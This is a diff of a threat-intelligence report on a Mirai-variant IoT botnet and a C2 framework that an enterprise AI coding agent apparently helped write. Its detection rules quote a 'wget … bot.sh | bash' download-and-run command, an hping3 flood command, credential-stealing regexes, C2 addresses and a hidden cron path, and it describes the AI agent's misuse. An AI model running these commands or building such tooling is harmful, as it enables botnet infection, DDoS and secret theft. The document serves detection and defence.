@@ -93,7 +93,7 @@ This is a **single-operator** case tracked as **UTA-2026-014** *(an internal tra
 The detection priorities, full rule corpus (29 rules: 10 YARA + 12 Sigma + 7 Suricata), and hunt strategies live in the [linked detection file](/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/), §10, and §14. The two highest-value targets:
 
 - **Single-rule botnet fingerprint:** the four operator-bespoke constants — XOR keys `0x54` / `0x42` / `0x45`, charset `1gba4cdom53nhp12ei0kfj`, botnet ID `PandoraNet`, and the `/bin/busybox SORA` token — give a near-zero-FP YARA hit across all 11 Naku architectures. The length-prefixed-string CNC option-key modification is the highest-value Suricata target (defeats stock Mirai IDS; T1095 sub-technique gap means campaign-level authoring for now).
-- **Diagnostic infection signatures:** outbound TCP/23 to `165.227.175.161` (Naku CNC, hardcoded inline as `0xa1afe3a5`) and outbound TCP/1337 to `87.106.143.220` (Matrix C2). Separately, `web_scraper_bot.py` carries regex extractors for AWS keys (`AKIA[0-9A-Z]{16}`), GitHub PATs, Slack, and Stripe live keys — hunt any web property hit by a 50–500-request sub-60-second burst with `verify=False` SSL for credential exposure.
+- **Diagnostic infection signatures:** outbound TCP/23 to `165.227.175.161` (Naku CNC, hardcoded inline as `0xa1afe3a5`) and outbound TCP/1337 to `87.106.143.220` (Matrix C2). Separately, `web_scraper_bot.py` carries regex extractors for AWS keys (`AKIA[0-9A-Z]{16}`), GitHub PATs, Slack, and Stripe live keys — hunt any web property hit by a 50-500-request sub-60-second burst with `verify=False` SSL for credential exposure.
 
 For executives reading only this section: this case is the first publicly documented operator-side capture of an enterprise AI coding agent (Atlassian Rovodev) authoring an offensive C2 framework end-to-end. The takeaway is not "block AI tools" but **treat enterprise AI-agent telemetry as a high-value security signal** — vendors need prompt-pattern policy detection, and defenders need behavioral detections for AI-co-authored offensive code (the universal-subset signature provides the rubric).
 
@@ -838,7 +838,7 @@ Three Naku samples produced full Zenbox Linux behavioral reports; the other seve
 - **Contacted URLs:** `127.0.0.1:52869/picdesc.xml` + `127.0.0.1:52869/wanipcn.xml` — the sandbox's emulated Realtek UPnP endpoints for CVE-2014-8361 exploit triggering; sandbox internal canaries, not operator infrastructure.
 - **Dropped files:** `/var/log/auth.log.1.gz` + `/var/log/kern.log.1.gz` — log files the bot rotated as part of evasion. No real droppers observed.
 - **Suricata alerts (HIGH severity):** `ET EXPLOIT Realtek SDK Miniigd UPnP SOAP Command Execution CVE-2014-8361 - Outbound`; `TGI HUNT HTTP Request to 127.0.0.1`.
-- **Spamhaus DROP listed traffic** — the bot's scan traffic hit Spamhaus block lists (groups 2, 4-6, 13, 23, 25, 29, 33-35, 58) — meaning the operator's bot is generating outbound traffic in IP ranges that defenders should block at perimeter regardless of port/protocol.
+- **Spamhaus DROP listed traffic**: the bot's scan traffic hit Spamhaus block lists (groups 2, 4-6, 13, 23, 25, 29, 33-35, 58) — meaning the operator's bot is generating outbound traffic in IP ranges that defenders should block at perimeter regardless of port/protocol.
 
 ### 6.2 32-byte Handshake Protocol — Matrix C2 Wire Format
 
@@ -941,7 +941,7 @@ The full IOC feed is at [`/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs
 
 > **Note on UTA identifiers:** "UTA" stands for Unattributed Threat Actor. UTA-2026-014 is an internal tracking designation assigned by The Hunters Ledger to actors observed across analysis who cannot yet be linked to a publicly named threat group. This label will not appear in external threat intelligence feeds or vendor reports — it is specific to this publication. If future evidence links this activity to a known named actor, the designation will be retired and updated accordingly.
 
-The overall operator-profile claim (English-speaking Hybrid AI-augmented solo-or-small-team operator) is held at **LOW 60% within the canonical LOW band (50–70%)**; this sub-report establishes the canonical Threat Actor Assessment for the Case 3 operator. Specific sub-claims hold at higher confidence: the HYBRID AI-augmented operator class assignment holds at HIGH (~80%); Atlassian Rovodev AI co-authoring of the Matrix C2 framework is DEFINITE (95%); the AI-Generated Offensive Code Structural Signature universal subset is DEFINITE for the cross-3-operator ecosystem-level claim; the solo-versus-small-team discrimination favors solo at HIGH (~80%); real-world identity remains INSUFFICIENT.
+The overall operator-profile claim (English-speaking Hybrid AI-augmented solo-or-small-team operator) is held at **LOW 60% within the canonical LOW band (50-70%)**; this sub-report establishes the canonical Threat Actor Assessment for the Case 3 operator. Specific sub-claims hold at higher confidence: the HYBRID AI-augmented operator class assignment holds at HIGH (~80%); Atlassian Rovodev AI co-authoring of the Matrix C2 framework is DEFINITE (95%); the AI-Generated Offensive Code Structural Signature universal subset is DEFINITE for the cross-3-operator ecosystem-level claim; the solo-versus-small-team discrimination favors solo at HIGH (~80%); real-world identity remains INSUFFICIENT.
 
 ### 9.1 Hybrid AI-Augmented Operator Class — Phase 7 ACH Result
 
@@ -1052,9 +1052,9 @@ The following claims are NOT supported by current evidence and MUST NOT be made:
 
 Detection coverage for this campaign is published as a per-case detection file: [`/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/`](/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/). The file contains **29 rules** distributed across three rule classes:
 
-- **10 YARA rules** — file-based detection for the Pandora-Mirai 11-architecture bot suite (operator-bespoke charset + XOR keys + Sora-fork token + `PandoraNet` botnet ID), the Matrix C2 Python framework (AI-Generated Code Signature anchors), `persistent_bot.sh` 5-vector persistence installer, AI-Generated Documentation Signature handoff documents, escalating-superlative naming pattern
-- **12 Sigma rules** — log-based detection for `wget http://87.106.143.220/bot.sh | bash` process trees, systemd unit file writes referencing `87.106.143.220`, cron entries writing to `/etc/cron.d/.cache_update`, JavaScript / Python framework invocations from non-end-user hosts, Discord bot API patterns, mass outbound TCP/23 + TCP/22 scanning bursts from IoT-class devices
-- **7 Suricata signatures** — network-based detection for the **operator-bespoke length-prefixed-string CNC option-key protocol modification** (highest defender-value rule), `hping3 --rand-source --data 65500` OVH-bypass attack pattern, CVE-2017-17215 + CVE-2014-8361 exploit signatures, JSON-over-TCP wire protocol on TCP/1337, DNS / NTP / memcached / SSDP amplification reflection bursts, scapy-detected raw-socket activity
+- **10 YARA rules**: file-based detection for the Pandora-Mirai 11-architecture bot suite (operator-bespoke charset + XOR keys + Sora-fork token + `PandoraNet` botnet ID), the Matrix C2 Python framework (AI-Generated Code Signature anchors), `persistent_bot.sh` 5-vector persistence installer, AI-Generated Documentation Signature handoff documents, escalating-superlative naming pattern
+- **12 Sigma rules**: log-based detection for `wget http://87.106.143.220/bot.sh | bash` process trees, systemd unit file writes referencing `87.106.143.220`, cron entries writing to `/etc/cron.d/.cache_update`, JavaScript / Python framework invocations from non-end-user hosts, Discord bot API patterns, mass outbound TCP/23 + TCP/22 scanning bursts from IoT-class devices
+- **7 Suricata signatures**: network-based detection for the **operator-bespoke length-prefixed-string CNC option-key protocol modification** (highest defender-value rule), `hping3 --rand-source --data 65500` OVH-bypass attack pattern, CVE-2017-17215 + CVE-2014-8361 exploit signatures, JSON-over-TCP wire protocol on TCP/1337, DNS / NTP / memcached / SSDP amplification reflection bursts, scapy-detected raw-socket activity
 
 **Highest-value detection authoring targets (priority order):**
 
@@ -1062,7 +1062,7 @@ Detection coverage for this campaign is published as a per-case detection file: 
 2. **Operator-bespoke binary constants YARA rule** (YARA Rule 1) — single rule catches all 11 Naku architectures via the 22-character charset + XOR keys + Sora-fork token combination
 3. **AI-Generated Code Signature universal-subset rubric** (YARA Rule 4) — applied to suspected operator Python code at the file or directory level (verbose docstrings + educational variable names + bare-except + Copy-Paste Indentation Decay + emoji-in-output bleed + version-numbered iteration files)
 4. **Cross-egress to `165.227.175.161:23`** (Suricata Rule 3) — Suricata rule on outbound TCP/23 from non-telnet-client processes
-5. **Process tree `cron → wget http://87.106.143.220/bot.sh → bash`** (Sigma Rules 2–3) — hidden-cron and multi-vector persistence detection coverage
+5. **Process tree `cron → wget http://87.106.143.220/bot.sh → bash`** (Sigma Rules 2-3) — hidden-cron and multi-vector persistence detection coverage
 
 **Coverage gaps (defender-relevant):**
 
@@ -1288,10 +1288,10 @@ For defenders running active hunt programs:
 
 ### 14.2 Strategic Recommendations
 
-- **Enterprise AI-agent telemetry as high-value security signal** — vendor-side T&S programs need policy violation detection at the prompt-pattern level (the operator's `whatineed.txt` prompt is unmistakably a malware-development specification)
-- **Defender-side detections cannot rely on absence of evasion as an AI-authorship signal** — criterion #4 of the AI-Generated Code Signature is prompt-conditional, not structural; escalated prompts produce anti-analysis content
-- **MITRE ATT&CK sub-technique gap** — proposed sub-technique label "Mirai-variant CNC Protocol Modification" would close the T1095 gap for IoT botnet protocol modification of the kind documented here
-- **IoT device firmware governance** — vendors of Huawei HG532 / Realtek-SDK / Netgear DGN / ZyXEL / Dasan / Netis / Guangzhou / Micro Focus consumer-broadband CPE should accelerate firmware updates closing CVE-2017-17215 / CVE-2014-8361 / CVE-2017-6077
+- **Enterprise AI-agent telemetry as high-value security signal**: vendor-side T&S programs need policy violation detection at the prompt-pattern level (the operator's `whatineed.txt` prompt is unmistakably a malware-development specification)
+- **Defender-side detections cannot rely on absence of evasion as an AI-authorship signal**: criterion #4 of the AI-Generated Code Signature is prompt-conditional, not structural; escalated prompts produce anti-analysis content
+- **MITRE ATT&CK sub-technique gap**: proposed sub-technique label "Mirai-variant CNC Protocol Modification" would close the T1095 gap for IoT botnet protocol modification of the kind documented here
+- **IoT device firmware governance**: vendors of Huawei HG532 / Realtek-SDK / Netgear DGN / ZyXEL / Dasan / Netis / Guangzhou / Micro Focus consumer-broadband CPE should accelerate firmware updates closing CVE-2017-17215 / CVE-2014-8361 / CVE-2017-6077
 
 ---
 
